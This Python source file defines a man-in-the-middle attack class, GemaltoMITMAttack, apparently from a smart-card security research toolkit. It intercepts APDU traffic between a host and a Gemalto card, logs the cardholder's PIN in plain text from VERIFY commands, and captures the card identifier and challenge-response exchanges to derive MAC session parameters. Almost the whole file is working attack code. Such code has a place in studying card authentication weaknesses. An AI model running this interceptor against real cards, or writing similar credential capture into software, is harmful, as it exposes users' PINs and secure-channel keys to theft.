import logging

from intercept_attack import InterceptAttack
from util import from_hex
from .crypto import GemaltoCrypto

logger = logging.getLogger(__name__)


class GemaltoMITMAttack(InterceptAttack):
    def __init__(self, os):
        super(GemaltoMITMAttack, self).__init__(os)
        self.crypto = GemaltoCrypto()

    def respond_to_message(self, msg):
        pass

    def read_response(self, msg, resp):
        # VERIFY
        if msg.startswith(from_hex("00 20 00 81 10")):
            pin = msg[5:].rstrip('\x00')
            logger.info("PIN: %s", pin)

        # Read binary of file 00 01
        if msg == from_hex("00 B0 00 00 08"):
            self.crypto.parse_card_identifier(resp)

        # Sending challenge
        elif msg == from_hex("80 84 00 00 08"):
            self.crypto.parse_card_challenge(resp)

        # Responding to challenge
        elif msg.startswith(from_hex("80 82 00 00 48")):
            self.crypto.parse_lib_challenge(msg)

        elif self.crypto.lib_nonce and msg == from_hex("80 C0 00 00 48"):
            self.crypto.parse_card_ch_response(resp)
            self.crypto.calc_mac_params()

        # MAC verification for class 0C
        elif msg[0] == "\x0C":
            self.crypto.check_message_mac(msg)
            self.crypto.check_response_mac(resp)
